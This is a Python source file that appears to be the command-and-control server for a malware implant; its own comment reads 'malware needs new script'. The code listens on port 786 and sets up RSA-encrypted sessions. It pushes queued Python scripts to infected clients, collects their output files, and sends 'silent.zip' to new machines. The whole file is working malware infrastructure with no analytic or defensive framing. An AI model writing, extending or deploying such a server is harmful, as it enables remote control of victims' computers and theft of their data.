import os
import socket
import rsa
import FileTransfer


def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 786))
    server_socket.listen()
    while (True):
        try:
            client_socket, client_ip = server_socket.accept()
            print('connection initiated')
            (public_key, private_key) = rsa.newkeys(1024)
            client_socket.send((str(public_key.n) + ':' + str(public_key.e)).encode())
            data = client_socket.recv(1024)
            encryption_key = rsa.decrypt(data, private_key)
            request = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
            print(request)
            # malware needs new script
            if (request == '<newscript>'):
                scripts = os.listdir('./queue')
                filename = ''
                while (filename == '' and scripts):
                    print(scripts)
                    if scripts[0].endswith('.py') or scripts[0] == 'move.txt':
                        filename = scripts[0]
                    else:
                        os.remove('./queue/' + scripts[0])
                        scripts = scripts[1:]
                print(filename)
                if filename != '':
                    FileTransfer.send(client_socket, encryption_key, filename, './queue/')
                    os.remove('./queue/' + filename)

                else:
                    print('no scripts')
                    client_socket.send(FileTransfer.encrypt('<nofile>'.encode(), encryption_key))
            elif (request == '<newoutput>'):
                data = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
                print(data)
                FileTransfer.receive(client_socket, encryption_key, data, './output/')
            elif (request == '<newpc>'):
                FileTransfer.send(client_socket, encryption_key, 'silent.zip', './')
            elif (request == '<doutput>'):
                print('<doutput> now')
                data = 'temp.txt:' + FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode().split(':')[1]
                print(data)
                FileTransfer.receive(client_socket, encryption_key, data, './')
                print('got default')
                client_socket.close()
                if(os.path.exists('./output/default.txt')):
                    mode = 'a'
                else:
                    mode = 'w'
                with open('./output/default.txt', mode) as data:
                    with open('./temp.txt', 'r') as f:
                        data.write(f.read())
                os.remove('./temp.txt')
            elif (request == '<update>'):
                print('update')
        except Exception as e:
            print(str(e))
        finally:
            if(client_socket):
                client_socket.close()
        print('closed connection')


if __name__ == '__main__':
    main()
